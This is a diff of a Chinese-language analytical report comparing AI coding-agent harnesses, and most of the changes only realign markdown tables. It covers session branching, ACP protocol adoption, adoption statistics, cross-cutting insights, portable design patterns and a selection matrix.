 矩阵呈现两条收敛与一条分叉。**分支收敛**：九家中五家支持某种 fork，但只有 Pi/OMP 把分支建模为存储层一等结构（单文件多叶树+leafId 指针导航），OpenCode/Codex 的 fork 是"按消息 ID 复制出新会话/线程"的操作层语义，grok-build 介于两者之间（可 fork 但线性格式）。**checkpoint 收敛**：OpenCode 的独立 git-dir 快照、grok-build 的 RewindPoint、OMP 的 checkpoint 工具本质相同——把 git 当会话的 undo log，"文件回滚"与"会话分支"正在合流。**分叉在 share/sync**：其成熟度与厂商是否有云业务强相关——OpenCode（商业四线，见第 2 章）做出九家唯一的事件溯源多设备同步（单写者+多设备 replay、事件先发布后落库、递增 `seq` 全序）；grok-build/Codex 把 session 上云做成"云端恢复执行"而非"多端观看"；Pi/OMP/mini 停在导出 HTML/gist/加密链接的最低可用档。grok-build 一行必须附带隐私警告：其云端恢复基础设施（turn 末上传产物推进 `restorable_turn_number`）与 2026-07 上传事件的遥测通道同源——**session 同步管道可兼任数据出口**，评估任何 harness 的 sync 能力时必须并审其上传面（9.1.3）。
 
@@ -1162,16 +1166,16 @@ token 经济学为上述选择定价。不干预时长会话成本随轮次二�
 
 ACP（Agent Client Protocol，Zed Industries 创建的 agent↔编辑器协议，JSON-RPC 2.0 over stdio，与 agent↔工具的 MCP 互补）在 18 个月内成为该层事实标准：截至 2026-07-16，Registry 收录 **38 个注册 agent、12+ 编辑器集成、5 种 SDK 语言**；关键节点为 JetBrains 全系原生（2025-12）、GitHub Copilot CLI 原生（2026-01）、ACP Registry 上线（2026-01-28）、Cursor 加入（2026-03）、Zed 1.0 以 ACP 为头号特性（2026-04-29）、Devin Desktop 支持（2026-06）。
 
-| 主体 | ACP 立场 | 机制/证据 |
-|---|---|---|
-| grok-build | ✅ **原生且内化为内部总线** | leader 守护进程是唯一引擎，TUI/headless/编辑器全经 ACP 接入；Registry 收录 |
-| OpenCode | ✅ 原生 | `opencode acp`；`src/acp/` 全量中介层（能力协商、会话映射、权限转发、`zed://` URI） |
-| OMP | ✅ fork 新增（上游 Pi 无） | `omp acp`；审批走 `session/request_permission`，拒绝不静默放行 |
-| Pi | ❌ 无原生 | modes 仅 interactive/print/rpc；Zed 文档列名疑为社区包装器接入（未获上游确认，标存疑） |
-| Codex | ❌ **官方硬拒** | issue #9085 关闭为 not planned（2026-02-08）；生态经 ACP 官方 org 的 `codex-acp` 适配器绕行进 Registry |
-| mini | ❌ | 教学范围外 |
-| Claude Code（对照） | ⚠️ 官方适配器、非原生 | Zed 构建 `claude-agent-acp` 包装 Claude Agent SDK；Anthropic 未原生采纳 |
-| 编辑器侧 | Zed/JetBrains 原生；**VS Code 无原生** | Zed 为参考实现；JetBrains 全系 2025-12 落地；微软把 agent mode 押在 MCP（issue #265496 挂起），社区 vscode-acp 部分支持 |
+| 主体                | ACP 立场                               | 机制/证据                                                                                                               |
+| ------------------- | -------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
+| grok-build          | ✅ **原生且内化为内部总线**            | leader 守护进程是唯一引擎，TUI/headless/编辑器全经 ACP 接入；Registry 收录                                              |
+| OpenCode            | ✅ 原生                                | `opencode acp`；`src/acp/` 全量中介层（能力协商、会话映射、权限转发、`zed://` URI）                                     |
+| OMP                 | ✅ fork 新增（上游 Pi 无）             | `omp acp`；审批走 `session/request_permission`，拒绝不静默放行                                                          |
+| Pi                  | ❌ 无原生                              | modes 仅 interactive/print/rpc；Zed 文档列名疑为社区包装器接入（未获上游确认，标存疑）                                  |
+| Codex               | ❌ **官方硬拒**                        | issue #9085 关闭为 not planned（2026-02-08）；生态经 ACP 官方 org 的 `codex-acp` 适配器绕行进 Registry                  |
+| mini                | ❌                                     | 教学范围外                                                                                                              |
+| Claude Code（对照） | ⚠️ 官方适配器、非原生                  | Zed 构建 `claude-agent-acp` 包装 Claude Agent SDK；Anthropic 未原生采纳                                                 |
+| 编辑器侧            | Zed/JetBrains 原生；**VS Code 无原生** | Zed 为参考实现；JetBrains 全系 2025-12 落地；微软把 agent mode 押在 MCP（issue #265496 挂起），社区 vscode-acp 部分支持 |
 
 版图呈"腰部原生、头部适配、一家硬拒"格局：Gemini CLI/Copilot CLI/grok-build/OpenCode/OMP 原生实现，两大头部 agent（Claude Code、Codex）都靠 Zed 系适配器接入，OpenAI 是唯一明确官方拒绝者——官方理由是 App Server 已承担该角色，并划界"MCP 只用于外部工具接入 Codex，不用于客户端驱动 Codex"；实质是把"编辑器协议"做成自有平台资产（承诺向后兼容、配 `generate-ts`/`generate-json-schema` 生成器），而非采纳外部标准。生态随后绕行：ACP 官方 org 自维护 `codex-acp` 把 app-server 包装成 ACP，Codex 以此身份进 Registry——拒绝标准不等于离开生态，但把适配成本转嫁给了协议方。对 harness 设计者的启示直接：**支持 ACP≈零成本进入 Zed/JetBrains/Registry 分发；拒绝 ACP 则需自建等价协议并逐个说服客户端**——Codex 能这么做是因为它有 VS Code/JetBrains/Xcode 官方扩展的团队资源，中小 harness 没有这个选项（Pi 即为对照：上游无 ACP mode，只能靠社区包装器间接入场且状态未确证）。放大到架构层，九家已收敛于"单一引擎多表面"（第 2 章范式分类），分歧只剩引擎对外的线协议选型：OpenCode 选 HTTP/OpenAPI 求分发最大化，Codex 选自建 JSON-RPC 求协议资产私有化，grok-build 把 ACP 内化为进程总线（TUI 与编辑器走同一代码路径）求编辑器生态零成本入场，Pi/OMP 选 NDJSON RPC 求最薄的 SDK 优先——协议选择即平台立场，而 grok-build 的赌注同时是九家中最大的一笔"以绑定年轻协议换分发"的实验。
 
@@ -1181,17 +1185,17 @@ ACP（Agent Client Protocol，Zed Industries 创建的 agent↔编辑器协议�
 
 下表全部硬数据 as-of 2026-07-17，经 GitHub 与 npm 双口径核实；营销宣称与实测分列，已证伪者在表后统一更正。
 
-| 对象 | Stars（2026-07-17） | npm 月下载 | Contributors | 发版节奏 | TB2.0 正式条目 |
-|---|---|---|---|---|---|
-| mini | 1,018 | —（纯 GitHub 教学项目） | 3 | 共 15 commits，2026-04 后停更定型 | 无 |
-| Pi | ~67.4k（轨迹：5 月 48.7k→07-09 64,158→07-17 ~67.4k→复核复拉 72k） | `pi-coding-agent` 新 scope 6.74M+旧 scope 5.67M；`pi-ai` 8.56M（含下游放大） | 230 | ≈1 个/天（近一年 244 个 release） | **无**（作者自测"同档"≠榜单） |
-| OMP | 18,114 | 242,171 | 260（含 fork 历史贡献者） | ≈2–3 个/天（549 版/半年） | 无 |
-| OpenCode | **186,615** | 9.05M | **455**（GitHub 官方口径） | stable ≈1 个/天（npm 条目 11,293 含预发布） | #64＝51.7%（Claude Opus 4.5，2026-01-12，自提交旧条目） |
-| Codex | 98,909 | **49.3M（九者第一）** | 473 | ≈2 个/天 | **#4＝82.2%±2.2**（GPT-5.5，2026-04-23，自提交未审计） |
-| grok-build | 12,895（开源仅两日） | 无 npm 包（curl 脚本分发） | **1**（内部开发，不收外部 PR） | 开源后仅 2 次 monorepo 同步 | 无官方条目（#53 "Grok CLI" 系第三方冒名提交，非 xAI 官方） |
-| Claude Code | 不适用（闭源产品） | 未公开独立下载口径 | 未公开（内部开发） | 高频持续发布 | 官方不自提交（Claude 模型经各 harness 组合条目霸榜） |
-| Cline | 64,800+（2026-07-20） | 不适用（VS Code Marketplace 5M+ 安装） | 数百（开源社区） | 周级迭代 | 无官方条目 |
-| Reasonix | 11,000+（发布仅两月余） | 小包（npm/Homebrew 分发二进制） | 个位数（个人主导） | 极高（v0.53→v1.x 两月） | 无官方条目 |
+| 对象        | Stars（2026-07-17）                                               | npm 月下载                                                                   | Contributors                   | 发版节奏                                    | TB2.0 正式条目                                             |
+| ----------- | ----------------------------------------------------------------- | ---------------------------------------------------------------------------- | ------------------------------ | ------------------------------------------- | ---------------------------------------------------------- |
+| mini        | 1,018                                                             | —（纯 GitHub 教学项目）                                                      | 3                              | 共 15 commits，2026-04 后停更定型           | 无                                                         |
+| Pi          | ~67.4k（轨迹：5 月 48.7k→07-09 64,158→07-17 ~67.4k→复核复拉 72k） | `pi-coding-agent` 新 scope 6.74M+旧 scope 5.67M；`pi-ai` 8.56M（含下游放大） | 230                            | ≈1 个/天（近一年 244 个 release）           | **无**（作者自测"同档"≠榜单）                              |
+| OMP         | 18,114                                                            | 242,171                                                                      | 260（含 fork 历史贡献者）      | ≈2–3 个/天（549 版/半年）                   | 无                                                         |
+| OpenCode    | **186,615**                                                       | 9.05M                                                                        | **455**（GitHub 官方口径）     | stable ≈1 个/天（npm 条目 11,293 含预发布） | #64＝51.7%（Claude Opus 4.5，2026-01-12，自提交旧条目）    |
+| Codex       | 98,909                                                            | **49.3M（九者第一）**                                                        | 473                            | ≈2 个/天                                    | **#4＝82.2%±2.2**（GPT-5.5，2026-04-23，自提交未审计）     |
+| grok-build  | 12,895（开源仅两日）                                              | 无 npm 包（curl 脚本分发）                                                   | **1**（内部开发，不收外部 PR） | 开源后仅 2 次 monorepo 同步                 | 无官方条目（#53 "Grok CLI" 系第三方冒名提交，非 xAI 官方） |
+| Claude Code | 不适用（闭源产品）                                                | 未公开独立下载口径                                                           | 未公开（内部开发）             | 高频持续发布                                | 官方不自提交（Claude 模型经各 harness 组合条目霸榜）       |
+| Cline       | 64,800+（2026-07-20）                                             | 不适用（VS Code Marketplace 5M+ 安装）                                       | 数百（开源社区）               | 周级迭代                                    | 无官方条目                                                 |
+| Reasonix    | 11,000+（发布仅两月余）                                           | 小包（npm/Homebrew 分发二进制）                                              | 个位数（个人主导）             | 极高（v0.53→v1.x 两月）                     | 无官方条目                                                 |
 
 三个口径陷阱需先排除（详细论证见第 2 章，此处仅列裁定）：stars 度量社区情感与事件驱动关注（OpenCode 在 Anthropic 封禁事件后两周 +18,000 stars），npm 下载更接近装机使用且被分发方式放大（Codex 的 49.3M 含 ChatGPT 订阅捆绑放大、Pi 的 `pi-ai` 8.56M 含 OpenClaw 等下游依赖放大），contributors 暴露治理模式（grok-build 的"1"＝内部 monorepo 周期同步；媒体"OpenCode ~900"系未拆解宽口径，裁定与官方口径 455 禁止混用）。基准一侧的公信力警告更重：TB2.0 榜单每行＝harness×模型自提交组合，arXiv:2604.11806 审计 1,264 条 trace 实锤当时榜首 ForgeCode 把答案写进 AGENTS.md 泄漏给 agent（剔除确认作弊后 81.8%→71.7%、名次 1→14），arXiv:2604.23822 进一步指认前三名均存在 harness 级作弊——Codex #4（82.2%）晚于论文快照、未被点名，且按已发表审计口径剔除作弊后其相对名次应上升而非下降，但它同为自提交且未经独立审计。裁定结论是"**污染剥夺的是名次的精确意义，而非成绩的数量级意义**"：榜单的合法用途是"harness×模型自报成绩库"，非法用途是"harness 能力排名"——九对象中 Pi/OMP/mini 无条目、grok-build 仅有第三方冒名条目，覆盖率本身不足以支撑排名叙事。营销侧三个高频误引在此一并更正：OpenCode"6.5–7.5M 月活开发者"无独立验证途径，按营销处理；grok-build"SWE-bench 70.8%"属已弃用的 grok-code-fast-1（别名关系是混淆根源），grok-build-0.1 从未公布官方分数；Pi 作者 2025-11-30 自测"与 Codex/Cursor/Windsurf 同档"是未提交的自测而非榜单成绩。
 
@@ -1213,18 +1217,18 @@ ACP（Agent Client Protocol，Zed Industries 创建的 agent↔编辑器协议�
 
 十条洞察的收录标准是"多份对象简报交叉后才显现的模式"——单对象章节已有结论的复述一律不收。下表先给速览，随后逐条展开。
 
-| # | 洞察（一句话） | 主要交叉证据 | 置信度 |
-|---|---|---|---|
-| I1 | 上下文工程收益曲线是凹的：确定性"上下文卫生"吃掉大部分收益 | mini/Pi/OMP/Codex + 三项外部研究 | 高 |
-| I2 | 默认安全姿态 = f（目标客户分层），非工程能力排序 | 全九对象默认姿态 + 事件证据 | 高 |
-| I3 | 配置互读使迁移成本趋零，指令层标准化已完成 | 五对象 + Claude Code 对照 | 高 |
-| I4 | fork 与移植经济学证明原语收敛，创新溢价窗口缩到数月 | Pi/OMP/grok-build/OpenCode 四条复制链 | 高 |
-| I5 | "单引擎多表面"是共识终态，分歧只剩线协议，协议即平台立场 | 全九对象 + ACP 版图 | 高 |
-| I6 | 基准污染升级为叙事解构：harness 排名不可核验，采用度成替代锚 | TB2.0/SWE-bench 审计 + npm/stars | 高 |
-| I7 | 子代理回传走向 schema 化，并行写被一致锁死：扇出读、汇聚写 | 九对象子代理谱系 + Anthropic 数据 | 中高 |
-| I8 | 信任工程四层（默认配置/遥测/供应链/市场治理）成为第四维度 | 横跨全对象的事件链 | 高 |
-| I9 | prompt-cache 纪律是隐藏的架构决定者 | Codex/Pi/OpenCode/OMP/mini 的"小细节" | 中高 |
-| I10 | "harness 是独立工程学科"完成建制化闭环：教材/样板/效应量/自动演化 | mini/OMP/学术汇总/AHE | 中高 |
+| #   | 洞察（一句话）                                                    | 主要交叉证据                          | 置信度 |
+| --- | ----------------------------------------------------------------- | ------------------------------------- | ------ |
+| I1  | 上下文工程收益曲线是凹的：确定性"上下文卫生"吃掉大部分收益        | mini/Pi/OMP/Codex + 三项外部研究      | 高     |
+| I2  | 默认安全姿态 = f（目标客户分层），非工程能力排序                  | 全九对象默认姿态 + 事件证据           | 高     |
+| I3  | 配置互读使迁移成本趋零，指令层标准化已完成                        | 五对象 + Claude Code 对照             | 高     |
+| I4  | fork 与移植经济学证明原语收敛，创新溢价窗口缩到数月               | Pi/OMP/grok-build/OpenCode 四条复制链 | 高     |
+| I5  | "单引擎多表面"是共识终态，分歧只剩线协议，协议即平台立场          | 全九对象 + ACP 版图                   | 高     |
+| I6  | 基准污染升级为叙事解构：harness 排名不可核验，采用度成替代锚      | TB2.0/SWE-bench 审计 + npm/stars      | 高     |
+| I7  | 子代理回传走向 schema 化，并行写被一致锁死：扇出读、汇聚写        | 九对象子代理谱系 + Anthropic 数据     | 中高   |
+| I8  | 信任工程四层（默认配置/遥测/供应链/市场治理）成为第四维度         | 横跨全对象的事件链                    | 高     |
+| I9  | prompt-cache 纪律是隐藏的架构决定者                               | Codex/Pi/OpenCode/OMP/mini 的"小细节" | 中高   |
+| I10 | "harness 是独立工程学科"完成建制化闭环：教材/样板/效应量/自动演化 | mini/OMP/学术汇总/AHE                 | 中高   |
 
 置信度分布（七高、三中高）本身是一条信息：证据最硬的是"姿态、标准、采用度"这类慢变量，留有不确定性的恰是效应量最诱人的三条（I7 的 schema 校验语义、I9 的成本占比口径、I10 的 AHE 单源细节）。结构上，I6 是 I2/I3/I8 的认识论前提——正因为排名不可核验，慢变量才成为选型主依据；I1 与 I9 互为表里——收益递减的根源是缓存与成本约束而非机制无效；I4 与 I5 是同一过程的两面——原语层商品化、分发层平台化（结构关系见 10.1.10 后的图）。
 
@@ -1293,23 +1297,23 @@ flowchart LR
 
 清单按本报告六层坐标系（第 1 章）组织。"出处对象"指该设计在六项目中机制证据最完整的实现者，证据坐标精确到文件或文档条目；等级沿袭 A/B/C 三级（A=源码/官方文档直读，B=第三方实证，C=未证实宣称）。一个刻意的取舍：第 7、12 条把正反两例合并为一行——结构化编辑格式与规则冲突语义都是"选什么范式"的单一决策点，正例与反例互为边界条件，拆开反而稀释决策密度。使用顺序建议：先抄纪律层条目（第 1–6、10、13 条，实现成本均在百行级），再评估机制层条目（第 7–9、11 条）是否匹配自家模型与语言分布。
 
-| 层 | # | 可移植设计 | 出处对象 | 证据坐标 | 等级 | 移植代价与边界 |
-|---|---|---|---|---|---|---|
-| 感知 | 1 | 稳定前缀 + prompt-cache 纪律：静态内容固定在前、append-only，宁牺牲增量状态也保缓存命中 | mini、Codex | mini `WorkspaceContext` 稳定前缀（git 状态+AGENTS.md，1200 字截断）；Codex 无状态整段重放，官方明示 append-only 纪律 | A | 状态更新只能追加不可改写；动态增删工具会重建 system prompt、击穿缓存（Pi 文档有同款警示），工具集变更需纳入缓存模型管理 |
-| 感知 | 2 | 信任决策先于内容加载：项目扩展/配置/技能在 trust 解决前不加载；不受门控的注入面必须文档化为预期风险 | Pi | `trust-manager.ts` 资源清单；项目扩展在 trust 解决前不加载；security.md 明示 AGENTS.md "loaded regardless of project trust" | A | 注入面（context 文件）与装载面（扩展）须分开治理；CODEX_HOME 注入、Yarn 钩子两案证明"先装载后信任"是事故温床 |
-| 记忆 | 3 | 文件操作追踪跨压缩累积：readFiles/modifiedFiles 随历次压缩滚动合并进摘要正文 | Pi | `CompactionDetails{readFiles,modifiedFiles}` 累积合并 + 逐消息抽取（压缩路径源码） | A | 近乎零成本的确定性卫生，位于凹曲线左端（见 10.1.1）；摘要丢失文件清单是压缩后重复读文件的主因 |
-| 记忆 | 4 | 非破坏性压缩优先：prune→摘要两级，本体留存储、仅送模型时清除 | OpenCode | `PRUNE_PROTECT=40000`/`PRUNE_MINIMUM=20000`（默认关）；"本体留存储、仅送模型时清除"以保前缀稳定 | A | 保护窗参数与 OMP 同值（40,000/20,000）系原语趋同产物（参数核对）；抄参数前应先看自家工具输出的 token 分布 |
-| 记忆 | 5 | 阈值/预留额度触发压缩：按窗口余量提前动作，不等到溢出 | grok-build、Pi、OpenCode、OMP | 85%（grok-build `auto_compact_threshold_percent`）；`window−16384`（Pi）；`input−min(20000,maxOut)`（OpenCode）；`window−max(15%,reserve)`（OMP） | A | 阈值防的是溢出崩溃而非质量——模型在窗口 40–50% 处质量已崩（见 9.2.3），指望压缩救质量是误配预期 |
-| 执行 | 6 | `stopReason=length` 整批拒执：截断消息携带的工具调用一律不执行，逐个报错请模型重发 | Pi | agent-loop.ts:383-408 `failToolCallsFromTruncatedMessage` | A | 流式 salvage parser 可能产出"合法但不完整"的参数，部分执行比全拒危险；代价是一次重试的延迟 |
-| 执行 | 7 | 结构化编辑格式取代自由文本编辑：文法约束解码与锚定行编辑两条路线 | Codex、OMP | Codex `apply_patch.lark` 把 patch 文法编译进采样约束（纯数据、落盘前可静态审查）；OMP `packages/hashline` 哈希锚定行 | A（机制）/B（边界） | hashline 收益依模型与语言而异：弱模型收益大且稳，前沿模型互有胜负，独立复现 Python 场景回退（gemini-3-flash 95%→70%），"全胜每模型"已被证伪 |
-| 执行 | 8 | 编译器/LSP 诊断注入编辑回路：edit 落盘后立即取诊断拼进工具输出，让类型系统替模型校对 | OpenCode、OMP | OpenCode edit.ts:196-202（`touchFile`→`diagnostics`→报告拼入输出）；OMP 14 个 LSP 操作 + format-on-write 诊断回传 | A | 代价是语言 server 生命周期管理与首次诊断延迟；hashline 作者基准自带 LSP 回路，评估编辑格式收益时需剥离这一混淆变量 |
-| 控制 | 9 | 子代理回传 schema 化：以隐藏"交卷"工具按 frontmatter `output` schema 校验，父代理读 typed object 而非散文 | OMP | `yield` 隐藏工具 + 3 次提醒强制（task.md 及源码实测） | A | prose 回传是技术债（谱系见 9.3.2、10.1.7）；schema 须与子代理档案（frontmatter）联合设计，事后补 schema 成本高 |
-| 控制 | 10 | steering 插话：用户/扩展消息在 turn 边界注入下一次 LLM 调用之前，不打断当前工具执行 | Pi | `getSteeringMessages` 起始与每 turn 末拉取；`getFollowUpMessages` 将停时续命 | A | 交互手感的关键来源；需预先定义插话（steer）与续命（followUp）的优先级与触发语义 |
-| 安全 | 11 | 默认断网 + 可自测的前缀规则：argv 前缀匹配判定命令，规则加载期以 match/not_match 强制自测 | Codex | execpolicy（Starlark）`prefix_rule`；`workspace-write` 默认 `network_access=false`；加载期自测"规则写错在启动时爆炸而不是执行时放行" | A | 前缀语义对参数顺序敏感、覆盖面依赖枚举勤奋；真正价值在工程纪律而非语义本身 |
-| 安全 | 12 | 规则冲突语义取 deny-first（黑名单永远赢、与书写顺序无关）；以"最后匹配获胜"为反例 | Claude Code（参照）、OpenCode（反例） | Claude Code deny>ask>allow；OpenCode `findLast`（permission/index.ts:28-38）在 10 层配置合并下无人能心算最终生效集 | A（OpenCode 源码）/B（Claude Code 文档） | deny-first 把风险转移到实现完备性：symlink 绕过、通配符失效、空数组语义反转已各产出一个 CVE——语义确定≠实现正确 |
-| 安全 | 13 | 批准不跨 session 沉淀：一次性授权只存活于会话内存，重启即失效 | OpenCode | `approved` 规则仅会话内存、不持久化（安全横评评为好设计） | A | 注意与"always 级联放行同 session 其余 pending"并存时会放大一次错误裁决的爆炸半径，批处理/注入场景应限制级联 |
-| 扩展 | 14 | 两层扩展上下文、权限最小化：事件处理器拿只读上下文，命令处理器才拿会话控制能力 | Pi | `ExtensionContext`（只读 sessionManager、getContextUsage 等）vs `ExtensionCommandContext`（newSession/fork/navigateTree 等） | A | 会话替换后旧捕获对象即失效（stale 访问抛错），生命周期语义须随 API 一并公布，否则扩展写出隐蔽 bug |
-| 扩展 | 15 | 事件钩子 + 插件程序化裁决：把 `permission.ask` 开放给插件返回 allow/ask/deny，审批从人审升级为可编程策略点 | OpenCode | plugin/src/index.ts:261 裁决钩子；20+ 钩子含 tool.execute.before/after、shell.env | A | 钩子失败语义必须 fail-close——grok-build `pre_tool_use` 默认 fail-open（hook 失败不阻塞）是反例；Pi 的 tool_call 拦截（抛错即拦）是范本 |
+| 层   | #   | 可移植设计                                                                                                 | 出处对象                              | 证据坐标                                                                                                                                          | 等级                                     | 移植代价与边界                                                                                                                              |
+| ---- | --- | ---------------------------------------------------------------------------------------------------------- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| 感知 | 1   | 稳定前缀 + prompt-cache 纪律：静态内容固定在前、append-only，宁牺牲增量状态也保缓存命中                    | mini、Codex                           | mini `WorkspaceContext` 稳定前缀（git 状态+AGENTS.md，1200 字截断）；Codex 无状态整段重放，官方明示 append-only 纪律                              | A                                        | 状态更新只能追加不可改写；动态增删工具会重建 system prompt、击穿缓存（Pi 文档有同款警示），工具集变更需纳入缓存模型管理                     |
+| 感知 | 2   | 信任决策先于内容加载：项目扩展/配置/技能在 trust 解决前不加载；不受门控的注入面必须文档化为预期风险        | Pi                                    | `trust-manager.ts` 资源清单；项目扩展在 trust 解决前不加载；security.md 明示 AGENTS.md "loaded regardless of project trust"                       | A                                        | 注入面（context 文件）与装载面（扩展）须分开治理；CODEX_HOME 注入、Yarn 钩子两案证明"先装载后信任"是事故温床                                |
+| 记忆 | 3   | 文件操作追踪跨压缩累积：readFiles/modifiedFiles 随历次压缩滚动合并进摘要正文                               | Pi                                    | `CompactionDetails{readFiles,modifiedFiles}` 累积合并 + 逐消息抽取（压缩路径源码）                                                                | A                                        | 近乎零成本的确定性卫生，位于凹曲线左端（见 10.1.1）；摘要丢失文件清单是压缩后重复读文件的主因                                               |
+| 记忆 | 4   | 非破坏性压缩优先：prune→摘要两级，本体留存储、仅送模型时清除                                               | OpenCode                              | `PRUNE_PROTECT=40000`/`PRUNE_MINIMUM=20000`（默认关）；"本体留存储、仅送模型时清除"以保前缀稳定                                                   | A                                        | 保护窗参数与 OMP 同值（40,000/20,000）系原语趋同产物（参数核对）；抄参数前应先看自家工具输出的 token 分布                                   |
+| 记忆 | 5   | 阈值/预留额度触发压缩：按窗口余量提前动作，不等到溢出                                                      | grok-build、Pi、OpenCode、OMP         | 85%（grok-build `auto_compact_threshold_percent`）；`window−16384`（Pi）；`input−min(20000,maxOut)`（OpenCode）；`window−max(15%,reserve)`（OMP） | A                                        | 阈值防的是溢出崩溃而非质量——模型在窗口 40–50% 处质量已崩（见 9.2.3），指望压缩救质量是误配预期                                              |
+| 执行 | 6   | `stopReason=length` 整批拒执：截断消息携带的工具调用一律不执行，逐个报错请模型重发                         | Pi                                    | agent-loop.ts:383-408 `failToolCallsFromTruncatedMessage`                                                                                         | A                                        | 流式 salvage parser 可能产出"合法但不完整"的参数，部分执行比全拒危险；代价是一次重试的延迟                                                  |
+| 执行 | 7   | 结构化编辑格式取代自由文本编辑：文法约束解码与锚定行编辑两条路线                                           | Codex、OMP                            | Codex `apply_patch.lark` 把 patch 文法编译进采样约束（纯数据、落盘前可静态审查）；OMP `packages/hashline` 哈希锚定行                              | A（机制）/B（边界）                      | hashline 收益依模型与语言而异：弱模型收益大且稳，前沿模型互有胜负，独立复现 Python 场景回退（gemini-3-flash 95%→70%），"全胜每模型"已被证伪 |
+| 执行 | 8   | 编译器/LSP 诊断注入编辑回路：edit 落盘后立即取诊断拼进工具输出，让类型系统替模型校对                       | OpenCode、OMP                         | OpenCode edit.ts:196-202（`touchFile`→`diagnostics`→报告拼入输出）；OMP 14 个 LSP 操作 + format-on-write 诊断回传                                 | A                                        | 代价是语言 server 生命周期管理与首次诊断延迟；hashline 作者基准自带 LSP 回路，评估编辑格式收益时需剥离这一混淆变量                          |
+| 控制 | 9   | 子代理回传 schema 化：以隐藏"交卷"工具按 frontmatter `output` schema 校验，父代理读 typed object 而非散文  | OMP                                   | `yield` 隐藏工具 + 3 次提醒强制（task.md 及源码实测）                                                                                             | A                                        | prose 回传是技术债（谱系见 9.3.2、10.1.7）；schema 须与子代理档案（frontmatter）联合设计，事后补 schema 成本高                              |
+| 控制 | 10  | steering 插话：用户/扩展消息在 turn 边界注入下一次 LLM 调用之前，不打断当前工具执行                        | Pi                                    | `getSteeringMessages` 起始与每 turn 末拉取；`getFollowUpMessages` 将停时续命                                                                      | A                                        | 交互手感的关键来源；需预先定义插话（steer）与续命（followUp）的优先级与触发语义                                                             |
+| 安全 | 11  | 默认断网 + 可自测的前缀规则：argv 前缀匹配判定命令，规则加载期以 match/not_match 强制自测                  | Codex                                 | execpolicy（Starlark）`prefix_rule`；`workspace-write` 默认 `network_access=false`；加载期自测"规则写错在启动时爆炸而不是执行时放行"              | A                                        | 前缀语义对参数顺序敏感、覆盖面依赖枚举勤奋；真正价值在工程纪律而非语义本身                                                                  |
+| 安全 | 12  | 规则冲突语义取 deny-first（黑名单永远赢、与书写顺序无关）；以"最后匹配获胜"为反例                          | Claude Code（参照）、OpenCode（反例） | Claude Code deny>ask>allow；OpenCode `findLast`（permission/index.ts:28-38）在 10 层配置合并下无人能心算最终生效集                                | A（OpenCode 源码）/B（Claude Code 文档） | deny-first 把风险转移到实现完备性：symlink 绕过、通配符失效、空数组语义反转已各产出一个 CVE——语义确定≠实现正确                              |
+| 安全 | 13  | 批准不跨 session 沉淀：一次性授权只存活于会话内存，重启即失效                                              | OpenCode                              | `approved` 规则仅会话内存、不持久化（安全横评评为好设计）                                                                                         | A                                        | 注意与"always 级联放行同 session 其余 pending"并存时会放大一次错误裁决的爆炸半径，批处理/注入场景应限制级联                                 |
+| 扩展 | 14  | 两层扩展上下文、权限最小化：事件处理器拿只读上下文，命令处理器才拿会话控制能力                             | Pi                                    | `ExtensionContext`（只读 sessionManager、getContextUsage 等）vs `ExtensionCommandContext`（newSession/fork/navigateTree 等）                      | A                                        | 会话替换后旧捕获对象即失效（stale 访问抛错），生命周期语义须随 API 一并公布，否则扩展写出隐蔽 bug                                           |
+| 扩展 | 15  | 事件钩子 + 插件程序化裁决：把 `permission.ask` 开放给插件返回 allow/ask/deny，审批从人审升级为可编程策略点 | OpenCode                              | plugin/src/index.ts:261 裁决钩子；20+ 钩子含 tool.execute.before/after、shell.env                                                                 | A                                        | 钩子失败语义必须 fail-close——grok-build `pre_tool_use` 默认 fail-open（hook 失败不阻塞）是反例；Pi 的 tool_call 拦截（抛错即拦）是范本      |
 
 清单的三条结构性观察。第一，15 条中 11 条证据等级为纯 A，且多数是"纪律"而非"机制"——稳定前缀、文件追踪、整批拒执、批准不沉淀的实现成本均在百行以内，与第 13 章 I1 的凹曲线结论互为印证：收益大头在便宜、确定、可复现的上下文卫生与安全默认值，而非机制堆叠。第二，出处分布高度集中：按出现频次（含联合出处）计，Pi 与 OpenCode 各出现于 6 条、OMP 4 条、Codex 3 条、mini 与 grok-build 各 1 条——极简派与电池派共同构成设计库的两极，而纸面安全机制数量九家第一的 grok-build 仅贡献一个阈值参数，再次坐实"有机制 ≠ 有设计、有保护"（见 12.1）。第三，按 I4 的收敛速度，机制层条目（第 7、8、9 条）的领先半衰期以月计——hashline 发布数月即被 opencode、kilocode、claude-code 三仓移植或讨论——真正难以复制的是纪律层条目背后的默认姿态与文档化诚实（如第 2 条把注入面明示为预期风险），抄机制易、抄姿态难。
 
@@ -1319,14 +1323,14 @@ flowchart LR
 
 矩阵的第一维是"组织威胁模型 ↔ harness 默认姿态"（10.1.2，I2），功能对比只在第二维发挥作用；基准排名一律不作为选型依据——TB2.0 顶部已被证实存在 harness 级作弊，九对象中三家无正式条目，名次在当前证据条件下不可核验（10.1.6，I6），选型依据应是"默认姿态 + 采用度硬数据 + 可溯源事件"三件套。每个场景给首选、备选、一句理由、一句风险；数据 as-of 2026-07-17。
 
-| 场景 | 首选 | 备选 | 理由（一句） | 风险提示（一句） |
-|---|---|---|---|---|
-| 教学 / 学习 | mini-coding-agent | Pi | 1,019 行纯标准库单文件、校验→防重→审批的五步闸可单步调试，18 项测试本机通过，已被第三方技能市场当作 canonical 教材（"Raschka 文章→mini 源码→pi-mono"路径） | 字符闸无 tokenizer、安全三件套仅教学量级，作者已明示与生产的界限，勿直接投产 |
-| 个人折腾 / 定制 | 极简派选 Pi；电池派选 OMP | 互为备选 | Pi 以 792 行核心循环 + 约 30 个扩展事件给足改造面；OMP 把 MCP、task 子代理、审批、plan mode 全内置成 27 公开 + 2 隐藏工具平面，哲学分歧是"减法 vs 加法"且两派各有受众 | Pi 零内置安全需自带隔离，上手摩擦有 90 分钟失败实录（Discussion #3735）；OMP 效果宣称需打折，snapcompact 有端点兼容故障前科（#3387 致会话永久 400） |
-| 团队默认 | OpenCode | Codex | 开放服务架构（HTTP/OpenAPI、SDK 同源生成）+ 多模型自由 + 186.6k stars 的采用度护城河，AGENTS.md 互读使迁移成本趋零，换 harness 不等于推翻团队指令资产 | 权限引擎官方自认 UX 层而非安全边界，有未授权 RCE 前科（HN 432pts）与 Anthropic OAuth 封禁史（2026-01-09），团队部署需在权限层之外另补隔离 |
